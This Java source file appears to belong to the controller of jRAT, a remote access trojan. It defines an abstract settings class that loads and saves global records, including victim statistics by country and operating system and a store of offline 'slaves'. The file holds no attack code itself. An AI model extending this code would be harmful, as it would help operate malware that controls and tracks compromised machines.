package jrat.controller.settings;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public abstract class AbstractStorable {

	private static final List<AbstractStorable> globalSettings = new ArrayList<>();
	
	public static void loadAllGlobals() {
		if (globalSettings.size() == 0) {
			globalSettings.add(StatisticsCountry.getGlobal());
			globalSettings.add(StatisticsOperatingSystem.getGlobal());
			globalSettings.add(SettingsCustomID.getGlobal());
			globalSettings.add(StoreOfflineSlaves.getGlobal());
		}

		for (AbstractStorable setting : globalSettings) {
			try {
				setting.load();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

	public static void saveAllGlobals() {
		for (AbstractStorable setting : globalSettings) {
			try {
				setting.save();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

	public abstract void save() throws Exception;

	public abstract void load() throws Exception;

	public abstract File getFile();

}
